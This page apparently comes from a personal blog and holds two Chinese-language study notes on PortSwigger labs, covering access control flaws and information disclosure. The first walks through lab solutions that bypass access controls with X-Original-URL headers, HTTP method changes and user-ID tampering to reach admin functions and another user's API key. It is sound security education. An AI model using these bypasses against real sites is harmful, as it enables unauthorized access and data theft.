<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="hr1sto">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Access control vulnerabilities and privilege escalation" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/02/02/Access%20control%20vulnerabilities%20and%20privilege%20escalation/" class="article-date">
  <time class="dt-published" datetime="2026-02-01T19:26:12.000Z" itemprop="datePublished">2026-02-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/02/02/Access%20control%20vulnerabilities%20and%20privilege%20escalation/">7.Access control vulnerabilities and privilege escalation</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.2.2</p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>在Web应用程序的背景下：</p>
<ol>
<li>身份验证确认用户是他们所说的那个人。</li>
<li>会话管理识别哪些后续的HTTP请求是由同一用户发出的。</li>
<li>访问控制确定用户是否被允许执行他们试图执行的操作。</li>
</ol>
<p>访问控制的设计和管理是一个复杂且动态的问题，它将业务、组织和法律约束应用于技术实现。访问控制的设计决策必须由人类做出，因此出错的可能性很高。</p>
<h2 id="1-1-垂直访问控制"><a href="#1-1-垂直访问控制" class="headerlink" title="1.1 垂直访问控制"></a>1.1 垂直访问控制</h2><p>垂直访问控制是一种限制敏感功能仅对特定类型用户访问的机制。通过垂直访问控制，不同类型的用户可以访问不同的应用程序功能。例如，管理员可能能够修改或删除任何用户的账户，而普通用户则没有权限执行这些操作。垂直访问控制可以是更细粒度的安全模型实现，旨在执行业务策略，例如职责分离和最小权限。</p>
<h2 id="1-2-水平访问控制"><a href="#1-2-水平访问控制" class="headerlink" title="1.2 水平访问控制"></a>1.2 水平访问控制</h2><p>水平访问控制是一种限制对资源的访问仅针对特定用户的机制。通过水平访问控制，不同的用户可以访问相同类型资源的一个子集。例如，银行应用程序将允许用户查看交易并从他们自己的账户中支付款项，但不能访问任何其他用户的账户。上下文相关的访问控制上下文相关的访问控制根据应用程序的状态或用户与应用程序的交互来限制对功能和资源的访问。</p>
<h2 id="1-3-上下文相关的访问"><a href="#1-3-上下文相关的访问" class="headerlink" title="1.3 上下文相关的访问"></a>1.3 上下文相关的访问</h2><p>上下文相关访问控制根据应用程序的状态或用户与其交互的情况，限制对功能和资源的访问权限。<br>上下文相关访问控制可防止用户执行操作顺序错误的情况。例如，零售网站可能禁止用户在完成付款后修改购物车中的商品。</p>
<h1 id="2-Examples-of-broken-access-controls"><a href="#2-Examples-of-broken-access-controls" class="headerlink" title="2.Examples of broken access controls"></a>2.Examples of broken access controls</h1><p>当用户能够访问其无权访问的资源或执行其无权执行的操作时，即存在访问控制漏洞。</p>
<h2 id="2-1-Vertical-privilege-escalation"><a href="#2-1-Vertical-privilege-escalation" class="headerlink" title="2.1 Vertical privilege escalation"></a>2.1 Vertical privilege escalation</h2><p>如果用户能够访问其无权限访问的功能，则构成垂直权限提升。例如，若非管理员用户能够访问管理页面并删除用户账户，则属于垂直权限提升。</p>
<h2 id="2-2-Unprotected-functionality"><a href="#2-2-Unprotected-functionality" class="headerlink" title="2.2 Unprotected functionality"></a>2.2 Unprotected functionality</h2><p>最基本的垂直权限提升问题源于应用程序未对敏感功能实施任何保护措施。例如，管理功能可能仅在管理员欢迎页面提供链接，而普通用户欢迎页面则未提供。但用户仍可通过浏览相关管理URL访问这些管理功能。<br>例如，某网站可能在以下URL托管敏感功能：<br>​<code>https://insecure-website.com/admin</code>​<br>该功能可能被任何用户访问，而不仅限于用户界面中拥有功能链接的管理员用户。某些情况下，管理URL可能在其他位置泄露，例如robots.txt文件：<br>​<code>https://insecure-website.com/robots.txt</code><br>即使URL未在任何位置泄露，攻击者仍可能通过字典攻击暴力破解敏感功能的位置。破损的访问控制漏洞存在于用户可以访问他们不应该能够访问的资源或执行操作时。</p>
<p>垂直权限升级如果用户可以获得他们无权访问的功能，那么这就是垂直权限升级。</p>
<p>‍</p>
<p>在某些情况下，通过提供一个不太可预测的URL来隐藏敏感功能。这就是一个所谓的“通过模糊实现安全”的例子。</p>
<p>然而，隐藏敏感功能并不能提供有效的访问控制，因为用户可能会通过多种方式发现模糊的URL。想象一个在以下URL托管管理功能的应用程序:</p>
<p>​<code>https://insecure-website.com/administrator-panel-yb556</code></p>
<p>攻击者可能无法直接猜测到。然而，该应用程序仍然可能会将URL泄露给用户。该URL可能会在根据用户角色构造用户界面的&#x3D;&#x3D;JavaScript中公开:&#x3D;&#x3D;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> isAdmin = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">		...</span><br><span class="line">		<span class="keyword">var</span> adminPanelTag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">		adminPanelTag.<span class="title function_">setAttribute</span>(<span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;https://insecure-website.com/administrator-panel-yb556&#x27;</span>);</span><br><span class="line">		adminPanelTag.<span class="property">innerText</span> = <span class="string">&#x27;Admin panel&#x27;</span>;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如果用户是管理员用户，该脚本将向用户的UI添加一个链接。但是，包含URL的脚本对所有用户都是可见的，而不管他们的角色是什么。</p>
<h3 id="基于参数的访问控制方法"><a href="#基于参数的访问控制方法" class="headerlink" title="基于参数的访问控制方法"></a>基于参数的访问控制方法</h3><p>一些应用程序在登录时确定用户的访问权限或角色，然后将此信息存储在用户可控制的位置。这可能是：</p>
<p>• 隐藏字段。</p>
<p>• Cookie。</p>
<p>• 预设查询字符串参数。</p>
<p>应用程序根据提交的值做出访问控制决定。例如：</p>
<p><a target="_blank" rel="noopener" href="https://insecure-website.com/login/home.jsp?admin=true">https://insecure-website.com/login/home.jsp?admin=true</a></p>
<p><a target="_blank" rel="noopener" href="https://insecure-website.com/login/home.jsp?role=1">https://insecure-website.com/login/home.jsp?role=1</a></p>
<p>这种方法是不安全的，因为用户可以修改值并访问他们无权访问的功能，例如管理功能。</p>
<p><img src="/images/image-20251126205956-11jnn18.png" alt="image"></p>
<p><img src="/images/image-20251126210334-8488y04.png" alt="image"></p>
<h3 id="Broken-access-control-resulting-from-platform-misconfiguration"><a href="#Broken-access-control-resulting-from-platform-misconfiguration" class="headerlink" title="Broken access control resulting from platform misconfiguration"></a>Broken access control resulting from platform misconfiguration</h3><p>一些应用程序在平台层实施访问控制。它们通过根据用户的角色限制对特定URL和HTTP方法的访问来实现这一点。</p>
<p>例如，一个应用程序可能会配置以下规则：</p>
<p>​<code>DENY: POST, /admin/deleteUser, managers</code></p>
<p> 这条规则禁止经理组用户对&#x2F;admin&#x2F;deleteUser URL上的POST方法访问。</p>
<p>在这种情况下，各种事情可能会出错，导致访问控制被绕过。一些应用程序框架支持各种非标准的HTTP头，这些头可以用来覆盖原始请求中的URL，例如&#x3D;&#x3D;X-Original-URL和X-Rewrite-URL。&#x3D;&#x3D;</p>
<p>这两个 HTTP头部（Header）是非标准的请求头，主要用于 <strong>URL 重写（URL Rewriting）</strong>  的场景中，特别是在微软的 <strong>IIS (Internet Information Services)</strong>  服务器以及基于 PHP 的框架（如 Symfony、Drupal）运行在 IIS 上时非常常见。</p>
<p>简单来说，它们的作用是​<strong>在服务器内部发生 URL 重写后，保存用户最初请求的原始 URL</strong>。</p>
<p>当 Web 服务器接收到一个请求时，它可能会根据配置规则将 URL 修改（Rewrite）为另一个路径，以便后端应用程序（如 PHP、ASP.NET）处理。</p>
<p>在这种情况下，后端应用处理的是“重写后”的 URL，但它往往需要知道用户浏览器里输入的“重写前”的 URL 是什么（用于生成页面链接、记录日志或路由判断）。</p>
<p>这两个 Header 就是用来承载这个信息的：</p>
<ul>
<li>​<strong>​<code>X-Original-URL</code>​</strong>: 包含原始请求的路径（包含查询字符串）。这是 IIS URL Rewrite 模块主要使用的 Header。</li>
<li>​<strong>​<code>X-Rewrite-URL</code>​</strong>: 作用与前者相同，通常作为备用，或者被特定的框架（如 Symfony）用来识别原始路径。</li>
</ul>
<p>如果一个网站使用严格的前端控制来根据URL限制访问，但应用程序允许通过请求头覆盖URL，那么可能会使用以下请求绕过访问控制：</p>
<p>​<code>POST / HTTP/1.1 X-Original-URL: /admin/deleteUser...</code></p>
<p>另一种攻击与请求中使用的HTTP方法有关。前几节中描述的前端控制根据URL和HTTP方法限制访问。在执行操作时，一些网站可以容忍不同的HTTP请求方法。如果攻击者可以使用GET（或其他）方法在受限的URL上执行操作，则他们可以绕过在平台层实施的访问控制。</p>
<h3 id="Lab-URL-based-access-control-can-be-circumvented"><a href="#Lab-URL-based-access-control-can-be-circumvented" class="headerlink" title="Lab: URL-based access control can be circumvented"></a>Lab: URL-based access control can be circumvented</h3><p><img src="/images/image-20251126211259-whskd2u.png" alt="image"></p>
<p><img src="/images/image-20251126211349-tzi1t8h.png" alt="image"></p>
<p><img src="/images/image-20251126211356-zusad98.png" alt="image"></p>
<ol>
<li><p>尝试加载&#x2F;admin页面，并观察你是否被阻止。请注意，响应非常简单，表明它可能来自前端系统。</p>
</li>
<li><p>将请求发送到Burp Repeater。将请求行中的URL更改为&#x2F;，并添加HTTP头X-Original-URL: &#x2F;invalid。观察应用程序返回一个“未找到”响应。这表明后端系统正在处理X-Original-URL头中的URL。</p>
<p>‍</p>
<p><img src="/images/image-20251126211901-oo7ftup.png" alt="image"></p>
</li>
<li><p>将X-Original-URL头的值更改为&#x2F;admin。观察你现在可以访问admin页面了。</p>
<p><img src="/images/image-20251126212953-x5j0j1j.png" alt="image"></p>
</li>
<li><p>要删除carlos，请在真实查询字符串中添加?username&#x3D;carlos，并将X-Original-URL路径更改为&#x2F;admin&#x2F;delete。</p>
<p><img src="/images/image-20251126213000-7sqaxng.png" alt="image"></p>
</li>
</ol>
<p>给的这个头啊，他会自己帮我们导过去。</p>
<h3 id="Lab-Method-based-access-control-can-be-circumvented"><a href="#Lab-Method-based-access-control-can-be-circumvented" class="headerlink" title="Lab: Method-based access control can be circumvented"></a>Lab: Method-based access control can be circumvented</h3><p>本实验室部分基于HTTP请求方法实现访问控制。您可以通过使用凭据管理员：admin登录来熟悉管理面板。要解决这个问题，请使用凭证wiener:peter登录，并利用有缺陷的访问控制将自己提升为管理员。</p>
<p><img src="/images/image-20251126215036-wosdbwu.png" alt="image"></p>
<p>使用管理员凭据登录。<br>浏览到管理面板，提升卡洛斯，并发送HTTP请求到Burp Repeater。<br>打开一个私有&#x2F;隐身浏览器窗口，并使用非管理员凭据登录。<br>尝试通过将非管理员用户的会话cookie复制到现有的Burp Repeater请求中，用非管理员用户重新提升卡洛斯，并观察响应显示“未授权”。</p>
<p><img src="/images/image-20251126215635-d0qcozk.png" alt="image"></p>
<p><img src="/images/image-20251126215632-84eahlr.png" alt="image"><br>将方法从POST改为POSTX，并观察响应更改为“缺少参数”。<br>通过右键单击并选择“更改请求方法”，将请求转换为使用GET方法。<br>将用户名参数更改为您的用户名并重新发送请求。</p>
<p><img src="/images/image-20251126215911-b3dj67b.png" alt="image"></p>
<h3 id="Broken-access-control-resulting-from-URL-matching-discrepancies"><a href="#Broken-access-control-resulting-from-URL-matching-discrepancies" class="headerlink" title="Broken access control resulting from URL-matching discrepancies"></a>Broken access control resulting from URL-matching discrepancies</h3><p>网站可以在多大程度上严格匹配传入请求到已定义端点的路径方面有所不同。例如，它们可能会容忍大小写不一致，因此对 &#x2F;ADMIN&#x2F;DELETEUSER 的请求可能仍然会被映射到 &#x2F;admin&#x2F;deleteUser 端点。</p>
<p>如果访问控制机制的容忍度较低，它可能会将它们视为两个不同的端点，并因此无法执行正确的限制。如果使用 Spring 框架的开发人员启用了 &#x3D;&#x3D;useSuffixPatternMatch&#x3D;&#x3D; 选项，那么也会出现类似的差异。这允许带有任意文件扩展名的路径被映射到没有文件扩展名的等效端点。换句话说，对 &#x2F;admin&#x2F;deleteUser.anything 的请求仍然会匹配 &#x2F;admin&#x2F;deleteUser 模式。</p>
<p>在 Spring 5.3 之前，此选项默认是启用的。在其他系统上，您可能会遇到 &#x2F;admin&#x2F;deleteUser 和 &#x2F;admin&#x2F;deleteUser&#x2F; 是否被视为不同端点的问题。在这种情况下，您可能可以通过&#x3D;&#x3D;在路径后附加尾随斜杠来绕过访问控制。&#x3D;&#x3D;</p>
<p>‍</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="2-3-Horizontal-privilege-escalation"><a href="#2-3-Horizontal-privilege-escalation" class="headerlink" title="2.3 Horizontal privilege escalation"></a>2.3 Horizontal privilege escalation</h2><p>横向权限提升是指如果一个用户能够获得属于另一个用户的资源的访问权限，而不是他们自己那种类型的资源。例如，如果一个员工可以访问其他员工的记录以及他们自己的记录，那么这就是横向权限提升。横向权限提升攻击可能使用与垂直权限提升相似的攻击方法。</p>
<p>例如，用户可能会使用以下URL访问他们自己的账户页面</p>
<p>​<code>https://insecure-website.com/myaccount?id=123</code></p>
<p>如果攻击者将id参数的值修改为另一个用户的id，他们可能会获得对另一个用户账户页面的访问权限，以及相关的数据和功能。</p>
<p>在某些应用程序中，可利用的参数没有可预测的值。例如，应用程序可能会使用全局唯一标识符（GUID）而不是递增的数字来标识用户。这可能会阻止攻击者猜测或预测其他用户的标识符。然而，属于其他用户的 GUID 可能在应用程序的其他地方公开，在这些地方引用了用户，例如用户消息或评论。</p>
<p>在某些情况下，应用程序确实能检测到用户未被允许访问该资源，并重定向到登录页面。然而，包含重定向的响应可能仍然包含一些属于目标用户的敏感数据，因此攻击仍然成功。</p>
<h2 id="2-4-Insecure-direct-object-references"><a href="#2-4-Insecure-direct-object-references" class="headerlink" title="2.4 Insecure direct object references"></a>2.4 Insecure direct object references</h2><p>不安全的直接对象引用（IDOR）是访问控制漏洞的一个子类别。当应用程序使用用户提供的输入直接访问对象时，若攻击者能通过篡改输入获得未经授权的访问权限，便会引发IDOR漏洞。该漏洞因入选OWASP 2007十大安全漏洞而广为人知。它只是众多可能绕过访问控制的实现错误之一。</p>
<p>‍</p>
<p>‍</p>
<h2 id="2-5-Access-control-vulnerabilities-in-multi-step-processes"><a href="#2-5-Access-control-vulnerabilities-in-multi-step-processes" class="headerlink" title="2.5 Access control vulnerabilities in multi-step processes"></a>2.5 Access control vulnerabilities in multi-step processes</h2><p>许多网站通过一系列步骤实现重要功能。这种情况常见于：<br>• 需要收集多种输入或选项时<br>• 用户需在操作执行前审核并确认细节时<br>例如，更新用户信息的行政功能可能涉及以下步骤：</p>
<ol>
<li>加载包含特定用户信息的表单</li>
<li>提交修改内容</li>
<li>审核修改内容并确认</li>
</ol>
<p>有时网站会对部分步骤实施严格访问控制，却忽略其他环节。设想某网站正确应用了前两步的访问控制，却未对第三步进行管控。该网站默认用户必须先完成受控的前两步才能进入第三步。攻击者可通过跳过前两步，直接提交包含必要参数的第三步请求，从而获得功能的非法访问权限。</p>
<h2 id="2-6-Referer-based-access-control"><a href="#2-6-Referer-based-access-control" class="headerlink" title="2.6 Referer-based access control"></a>2.6 Referer-based access control</h2><p>某些网站基于HTTP请求中提交的Referer头进行访问控制。浏览器可向请求添加Referer头，以指示发起请求的来源页面。<br>例如，某应用程序对主管理页面&#x2F;admin实施严格访问控制，但对子页面（如&#x2F;admin&#x2F;deleteUser）仅检查Referer头。若Referer头包含主&#x2F;admin网址，则允许请求通过。<br>此时攻击者可完全操控Referer头部。这意味着他们能通过伪造所需的Referer头部，直接向敏感子页面发起请求并获得未经授权的访问权限。</p>
<h2 id="2-7-Location-based-access-control"><a href="#2-7-Location-based-access-control" class="headerlink" title="2.7 Location-based access control"></a>2.7 Location-based access control</h2><p>某些网站会根据用户的地理位置实施访问控制。例如，银行应用程序或媒体服务可能因适用国家法规或商业限制而采用此类措施。用户通常可通过使用网络代理、VPN或操纵客户端地理位置机制来规避这些访问限制。</p>
<h1 id="3-如何防止访问控制漏洞"><a href="#3-如何防止访问控制漏洞" class="headerlink" title="3.如何防止访问控制漏洞"></a>3.如何防止访问控制漏洞</h1><p>可以通过采取深度防御方法和应用以下原则来防止访问控制漏洞：</p>
<p>• 切勿仅依赖混淆来实施访问控制。</p>
<p>• 除非资源旨在公开访问，否则应默认拒绝访问。</p>
<p>• 在可能的情况下，使用单一的应用范围机制来实施访问控制。</p>
<p>• 在代码级别，强制要求开发人员声明允许对每个资源进行的访问，并默认拒绝访问。</p>
<p>• 彻底审核和测试访问控制，以确保其按设计工作。</p>
<p>‍</p>
<h1 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h1><h2 id="Lab-User-ID-controlled-by-request-parameter-with-unpredictable-user-IDs"><a href="#Lab-User-ID-controlled-by-request-parameter-with-unpredictable-user-IDs" class="headerlink" title="Lab: User ID controlled by request parameter, with unpredictable user IDs"></a>Lab: User ID controlled by request parameter, with unpredictable user IDs</h2><ol>
<li>Find a blog post by <code>carlos</code>.</li>
<li>Click on <code>carlos</code> and observe that the URL contains his user ID. Make a note of this ID.</li>
<li>Log in using the supplied credentials and access your account page.</li>
<li>Change the “id” parameter to the saved user ID.</li>
<li>Retrieve and submit the API key.</li>
</ol>
<p><img src="/images/image-20251126221845-711g55i.png" alt="image"></p>
<p><img src="/images/image-20251126221848-m2g3v3u.png" alt="image"></p>
<p><img src="/images/image-20251126221917-dkz9gkr.png" alt="image"></p>
<h2 id="Lab-User-ID-controlled-by-request-parameter-with-data-leakage-in-redirect"><a href="#Lab-User-ID-controlled-by-request-parameter-with-data-leakage-in-redirect" class="headerlink" title="Lab: User ID controlled by request parameter with data leakage in redirect"></a>Lab: User ID controlled by request parameter with data leakage in redirect</h2><p><img src="/images/image-20251126222021-idk89kb.png" alt="image"></p>
<p>使用提供的凭据登录并访问您的帐户页面。2. 发送请求到打嗝中继器。将“id”参数更改为carlos。4. 注意，尽管响应现在将您重定向到主页，但它有一个包含属于carlos的API密钥的主体。5. 提交API密钥。</p>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/02/02/Access%20control%20vulnerabilities%20and%20privilege%20escalation/" data-id="cml4mld0t00009gvs99z4awdg" data-title="7.Access control vulnerabilities and privilege escalation" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Information disclosure" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/25/Information%20disclosure/" class="article-date">
  <time class="dt-published" datetime="2026-01-25T07:09:15.000Z" itemprop="datePublished">2026-01-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/25/Information%20disclosure/">6.Information disclosure</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.25</p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>信息泄露，也称为信息泄漏，是指网站无意中向其用户透露敏感信息。根据上下文，网站可能会向潜在的攻击者泄露各种信息，包括：<br>• 其他用户的数据，例如用户名或财务信息<br>• 敏感的商业或业务数据<br>• 网站及其基础设施的技术细节</p>
<p>信息泄露的一些基本示例如下：<br>• 通过robots.txt文件或目录列表显示隐藏目录的名称、结构和内容。<br>• 通过临时备份提供对源代码文件的访问。<br>• 在错误消息中明确提及数据库表或列的名称。<br>• 不必要地暴露高度敏感的信息，例如信用卡详细信息。<br>• 在源代码中硬编码API密钥、IP地址、数据库凭证等。<br>• 通过应用程序行为的细微差异来暗示资源、用户名等的存在或不存在。</p>
<p>信息泄露漏洞可能以无数不同的方式出现，但大致可以分为以下几类：<br>• 未从公开内容中删除内部内容。例如，标记中的开发者注释有时在生产环境中对用户可见。<br>• 网站和相关技术的不安全配置。例如，未能禁用调试和诊断功能有时会为攻击者提供有用的工具，帮助他们获取敏感信息。默认配置也可能使网站容易受到攻击，例如，通过显示过于详细的错误消息。<br>• 应用程序有缺陷的设计和行为。例如，如果网站在发生不同的错误状态时返回不同的响应，这也可以允许攻击者枚举敏感数据，例如有效的用户凭证。</p>
<h1 id="2-How-to-test-for-information-disclosure-vulnerabilities"><a href="#2-How-to-test-for-information-disclosure-vulnerabilities" class="headerlink" title="2.How to test for information disclosure vulnerabilities"></a>2.How to test for information disclosure vulnerabilities</h1><p>应避免过于狭隘地关注某一特定漏洞。敏感数据可能通过各种途径泄露，因此注意不要遗漏以后可能有用的任何信息,通常会在测试其他内容时找到敏感数据。</p>
<h2 id="2-1-Fuzzing"><a href="#2-1-Fuzzing" class="headerlink" title="2.1 Fuzzing"></a>2.1 Fuzzing</h2><p>如果你发现了有趣的参数，可以尝试提交意想不到的数据类型和专门制作的模糊字符串，看看会有什么效果。</p>
<p>虽然响应有时会明确透露有趣的信息，但它们也可以更微妙地暗示应用程序的行为。这可能是处理请求所花费的时间的细微差异。即使错误消息的内容没有透露任何信息，但有时遇到一种错误情况而不是另一种错误情况的事实本身就是有用的信息。</p>
<p>你可以使用Burp Intruder等工具自动化这个过程的大部分工作。这样做有几个好处，最明显的是，你可以：</p>
<ol>
<li>将有效负载位置添加到参数中，并使用模糊字符串的预构建字典来快速连续测试大量不同的输入。</li>
<li>通过比较HTTP状态码、响应时间、长度等，轻松识别响应中的差异。</li>
<li>使用grep匹配规则快速识别关键词的出现，例如error、invalid、SELECT、SQL等。</li>
<li>应用grep提取规则提取并比较响应中有趣项目的含量。</li>
</ol>
<p>您还可以使用Logger++扩展，可以从BApp商店获得。除了记录来自Burp所有工具的请求和响应之外，它还允许您定义高级过滤器，以突出显示感兴趣的条目。这只是众多Burp扩展之一，可以帮助您找到网站泄露的任何敏感数据。</p>
<h2 id="2-2-Using-Burp-Scanner"><a href="#2-2-Using-Burp-Scanner" class="headerlink" title="2.2 Using Burp Scanner"></a>2.2 Using Burp Scanner</h2><p>在您浏览时提供实时扫描功能以审核项目，或者您可以安排自动扫描代表您抓取并审核目标站点。</p>
<p>两种方法都会自动为您标记许多信息泄露漏洞。例如，如果Burp Scanner在响应中找到敏感信息（例如私钥、电子邮件地址和信用卡号），它会提醒您。它还会识别任何备份文件、目录列表等。</p>
<h2 id="2-3-Using-Burp’s-engagement-tools"><a href="#2-3-Using-Burp’s-engagement-tools" class="headerlink" title="2.3 Using Burp’s engagement tools"></a>2.3 Using Burp’s engagement tools</h2><p>Burp Suite 提供了几种参与工具，您可以使用这些工具更轻松地在目标网站中找到有趣的信息。 您可以从上下文菜单访问参与工具——只需右键单击任何 HTTP 消息、Burp 代理条目或站点地图中的项目，然后转到“参与工具”。 在这种情况下，以下工具特别有用。</p>
<h3 id="2-3-1-Search"><a href="#2-3-1-Search" class="headerlink" title="2.3.1 Search"></a>2.3.1 Search</h3><p>您可以使用此工具在所选项目中查找任何表达式。 您可以使用各种高级搜索选项微调结果，例如正则表达式搜索或否定搜索。 这对于快速查找特定兴趣关键词的出现（或缺失）很有用。</p>
<h3 id="2-3-2-Find-comments"><a href="#2-3-2-Find-comments" class="headerlink" title="2.3.2 Find comments"></a>2.3.2 Find comments</h3><p> 您可以使用此工具快速提取在所选项目中发现的所有开发人员注释。 它还提供选项卡，可立即访问找到每个注释的 HTTP 请求&#x2F;响应周期。</p>
<h3 id="2-3-3-Discover-content"><a href="#2-3-3-Discover-content" class="headerlink" title="2.3.3 Discover content"></a>2.3.3 Discover content</h3><p>您可以使用此工具来识别网站可见内容中未链接的其他内容和功能。 这对于查找站点地图自动中不会出现的其他目录和文件很有用。</p>
<h2 id="2-4-Engineering-informative-responses"><a href="#2-4-Engineering-informative-responses" class="headerlink" title="2.4 Engineering informative responses"></a>2.4 Engineering informative responses</h2><p>详细的错误信息有时候会在你进行正常的测试工作时，透露一些有趣的信息。然而，通过研究错误信息根据你的输入而变化的方式，你可以将这个方法更进一步。在某些情况下，你将可以操作网站通过错误信息来提取任意数据。</p>
<p>有许多种方法可以做到这一点，这取决于你所遇到的特定情况。一个常见的例子是让应用程序逻辑对特定数据项尝试一个无效的操作。例如，提交一个无效的参数值可能会导致一个包含有趣细节的堆栈跟踪或调试响应。你有时可以导致错误消息在响应中披露你所需数据的值。</p>
<h1 id="3-Common-sources-of-information-disclosure"><a href="#3-Common-sources-of-information-disclosure" class="headerlink" title="3.Common sources of information disclosure"></a>3.Common sources of information disclosure</h1><h2 id="3-1-Files-for-web-crawlers"><a href="#3-1-Files-for-web-crawlers" class="headerlink" title="3.1 Files for web crawlers"></a>3.1 Files for web crawlers</h2><p>许多网站在&#x2F;robots.txt和&#x2F;sitemap.xml提供文件，以帮助网络爬虫浏览他们的网站。除了其他事项，这些文件通常会列出网络爬虫应该跳过的特定目录，例如，因为它们可能包含敏感信息。</p>
<p>由于这些文件通常不会从网站内部链接，因此它们可能不会立即出现在Burp的站点地图中。然而，尝试手动导航到&#x2F;robots.txt或&#x2F;sitemap.xml，看看是否能找到有用的东西是值得的。</p>
<h2 id="3-2-Directory-listings"><a href="#3-2-Directory-listings" class="headerlink" title="3.2 Directory listings"></a>3.2 Directory listings</h2><p>Web服务器可以被配置为在不存在索引页面的情况下自动列出目录的内容。这可以帮助攻击者通过使他们能够快速识别给定路径上的资源，并直接进行分析和攻击这些资源。它特别增加了目录中敏感文件的暴露，这些文件不是打算让用户访问的，例如临时文件和崩溃转储。</p>
<p>目录列表本身并不一定是一个安全漏洞。然而，如果网站也没有实施正确的访问控制，以这种方式泄露敏感资源的存在和位置显然是一个问题。</p>
<p><img src="/images/image-20251124191232-jl27bjy.png" alt="image"></p>
<h2 id="3-3-Developer-comments"><a href="#3-3-Developer-comments" class="headerlink" title="3.3 Developer comments"></a>3.3 Developer comments</h2><p>在开发过程中，有时会在标记中添加内联HTML注释。这些注释通常会在更改部署到生产环境之前被删除。然而，这些注释有时会被忘记、遗漏，甚至有人故意留下，因为他们没有完全意识到安全影响。虽然这些注释在渲染的页面上不可见，但可以使用Burp甚至浏览器内置的开发人员工具轻松访问它们。有时，这些注释包含对攻击者有用的信息。例如，它们可能会暗示隐藏目录的存在，或提供有关应用程序逻辑的线索。</p>
<h2 id="3-4-Error-messages"><a href="#3-4-Error-messages" class="headerlink" title="3.4 Error messages"></a>3.4 Error messages</h2><p>信息泄露是最常见的漏洞之一，通常是由于详细的错误消息导致的。通常，你在审计过程中应该密切关注所有遇到的错误消息。</p>
<p>错误消息的内容可以揭示有关给定参数期望什么输入或数据类型的信息。这可以帮助您通过识别可利用的参数来缩小攻击范围。它甚至可以防止您浪费时间尝试注入根本不起作用的有效负载。</p>
<p>详细的错误消息还可以提供有关网站使用的不同技术的信息。例如，它们可能会明确命名网站正在使用的模板引擎、数据库类型或服务器，以及其版本号。这些信息非常有用，因为您可以轻松地搜索此版本可能存在的任何已记录漏洞。</p>
